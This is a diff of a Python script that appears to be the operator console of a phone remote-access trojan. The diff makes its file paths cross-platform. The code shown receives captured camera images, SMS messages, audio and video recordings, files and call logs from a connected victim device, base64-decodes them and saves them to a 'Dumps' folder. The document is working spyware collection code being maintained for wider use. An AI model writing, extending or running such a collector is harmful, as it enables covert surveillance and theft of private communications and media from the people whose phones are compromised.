@@ -11,12 +11,13 @@ from subprocess import PIPE, run
 
 if(platform.system() == 'Windows'):
     clear = lambda: os.system('cls')
+    direc = "\\"
 else:
     clear = lambda: os.system('clear')
+    direc = "/"
 
-if not os.path.isdir(os.getcwd()+"\\Dumps"):
+if not os.path.isdir(os.getcwd()+direc+"Dumps"):
     os.makedirs("Dumps")
-
 
 def is_valid_ip(ip):
     m = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", ip)
@@ -32,7 +33,7 @@ def executeCMD(command):
 
 
 def getpwd(name):
-	return os.getcwd()+"\\"+name;
+	return os.getcwd()+direc+name;
 
 def help():
     helper="""
@@ -62,7 +63,7 @@ def getImage(client):
     print("Taking Image")
     timestr = time.strftime("%Y%m%d-%H%M%S")
     flag=0
-    filename ="Dumps\\Image_"+timestr+'.jpg'
+    filename ="Dumps"+direc+"Image_"+timestr+'.jpg'
     imageBuffer=recvall(client) 
     imageBuffer = imageBuffer.strip().replace("END123","").strip()
     if imageBuffer=="":
@@ -84,7 +85,7 @@ def readSMS(client,data):
     print("Getting "+data+" SMS")
     msg = "start"
     timestr = time.strftime("%Y%m%d-%H%M%S")
-    filename = "Dumps\\"+data+"_"+timestr+'.txt'
+    filename = "Dumps"+direc+data+"_"+timestr+'.txt'
     flag =0
     with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
         msg = recvall(client)
@@ -98,7 +99,7 @@ def readSMS(client,data):
     	os.remove(filename)
 
 def getFile(filename,ext,data):
-    fileData = "Dumps\\"+filename+"."+ext
+    fileData = "Dumps"+direc+filename+"."+ext
     flag=0
     with open(fileData, 'wb') as file:
         try:
@@ -197,7 +198,7 @@ def stopAudio(client):
     flag =0
     data=recvall(client) 
     data = data.strip().replace("END123","").strip()
-    filename = "Dumps\\Audio_"+timestr+".mp4"
+    filename = "Dumps"+direc+"Audio_"+timestr+".mp4"
     with open(filename, 'wb') as audio:
         try:
             audioData = base64.b64decode(data)
@@ -218,7 +219,7 @@ def stopVideo(client):
     flag=0
     data=recvall(client) 
     data = data.strip().replace("END123","").strip()
-    filename = "Dumps\\Video_"+timestr+'.mp4' 
+    filename = "Dumps"+direc+"Video_"+timestr+'.mp4' 
     with open(filename, 'wb') as video:
         try:
             videoData = base64.b64decode(data)
@@ -235,7 +236,7 @@ def callLogs(client):
     msg = "start"
     timestr = time.strftime("%Y%m%d-%H%M%S")
     msg = recvall(client)
-    filename = "Dumps\\Call_Logs_"+timestr+'.txt'
+    filename = "Dumps"+direc+"Call_Logs_"+timestr+'.txt'
     if "No call logs" in msg:
     	msg.split("\n")
     	print(msg.replace("END123","").strip())
